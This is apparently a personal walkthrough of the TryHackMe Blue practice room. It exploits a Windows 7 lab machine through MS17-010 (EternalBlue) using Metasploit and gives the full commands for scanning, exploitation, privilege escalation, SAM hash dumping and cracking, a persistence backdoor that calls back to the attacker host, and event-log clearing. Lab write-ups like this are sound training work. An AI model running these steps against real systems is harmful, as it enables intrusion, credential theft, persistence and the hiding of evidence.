# TryHackMe Blue – Full Walkthrough

**Target:** Windows 7 (MS17-010 – EternalBlue)  

---

## Overview

This walkthrough documents my complete process for completing the TryHackMe Blue room. It covers:

- Reconnaissance
- MS17‑010 vulnerability validation
- Exploitation using EternalBlue
- Privilege escalation
- Credential extraction
- NTLM hash cracking
- Post‑exploitation enumeration

The purpose of this room is to provide a guided, beginner‑friendly environment to practice SMB exploitation on a Windows 7 system.

- **Target Machine:** Windows 7 SP1 x64 vulnerable to MS17‑010 (EternalBlue)  
- **Attack Environment:** TryHackMe AttackBox running Kali Linux

---

## Task 1: Recon

### 1. Start the Virtual Environment

I launched both the AttackBox and the target machine, confirmed connectivity, and prepared for scanning.

### 2. Port Scan

The target does not respond to ICMP ping, so I scanned directly:
```bash
nmap -p 1-999 <target_ip>
```
**Open Ports:**

- `135/tcp  open  msrpc`
- `139/tcp  open  netbios-ssn`
- `445/tcp  open  microsoft-ds`

<img width="960" height="1032" alt="1" src="https://github.com/user-attachments/assets/1ef3e874-b15c-47c4-bdab-4ae7c0ed299d" />

### 3. Vulnerability Detection

Checking SMB vulnerability:
```bash
nmap -p 445 --script smb-vuln-ms17-010 <target_ip>
```
**Result:**

> Vulnerable to MS17‑010  
> CVE‑2017‑0143  
> Remote Code Execution confirmed

---

## Task 2: Gain Access

### 1. Start Metasploit

```bash
msfconsole
```

### 2. Find EternalBlue Exploit

```bash
search ms17_010
```

**Selected module:**  
`exploit/windows/smb/ms17_010_eternalblue`

### 3. Configure Options

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target_ip>
set LHOST <attackbox_ip>
run
```

<img width="960" height="1032" alt="3" src="https://github.com/user-attachments/assets/48cd1304-fb2d-4fc5-b3e7-d19e828be76b" />

### 4. Meterpreter Session Gained

Successful exploitation yielded:

- Windows 7 SP1 x64
- Full Meterpreter shell access

---

## Task 3: Escalate Privileges

EternalBlue often provides SYSTEM immediately. I confirmed:
```bash
getuid
```

<img width="960" height="1032" alt="4" src="https://github.com/user-attachments/assets/571ef966-b09b-4521-98c8-dcc84ae5d920" />

If not SYSTEM, I used the local exploit suggester:
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
Example escalation module:
```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
run
```
After escalation:
```bash
getuid
```
**Confirmed:** `NT AUTHORITY\SYSTEM`

---

## Task 4: Credential Extraction & Cracking

### 1. Dump SAM Hashes

```bash
hashdump
```
<img width="960" height="1032" alt="5" src="https://github.com/user-attachments/assets/b21bf616-ed71-4d42-b43d-b52e0301bacf" />

Save the NT hash:
```bash
echo "<hash_here>" > hash.txt
```

### 2. Crack NTLM Hash Using John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked password:** `Password123`

<img width="960" height="1032" alt="6" src="https://github.com/user-attachments/assets/67ed0cef-8bf0-4830-9c3a-1967272deaca" />

---

## Task 5: Post Exploitation

### 1. System Enumeration

```bash
sysinfo
ipconfig
netstat -ano
```

<img width="960" height="1032" alt="7" src="https://github.com/user-attachments/assets/4491f525-bc68-49a9-873d-bd60847fd8a2" />

### 2. User Enumeration

```bash
net user
net localgroup administrators
```

### 3. File System Inspection

```bash
dir C:\
search -f flag*
download <file>
```

### 4. Persistence (Demonstration Only)

```bash
run persistence -U -i 10 -p 4444 -r <attackbox_ip>
```

<img width="960" height="1032" alt="8" src="https://github.com/user-attachments/assets/ea25343b-314a-4827-b142-6d7f2d7a957c" />

### 5. Clearing Traces (For Learning Only)

Typical example:
```bash
clearev
```

---

## Summary

This walkthrough demonstrated essential Windows exploitation techniques:

- Nmap enumeration
- MS17-010 detection
- EternalBlue exploitation via Metasploit
- Privilege escalation
- SAM hash extraction
- NTLM password cracking
- System & user enumeration
- Persistence demonstration

> **The TryHackMe Blue room is an excellent starting point for learning Windows exploitation and SMB vulnerability analysis in a safe environment.**
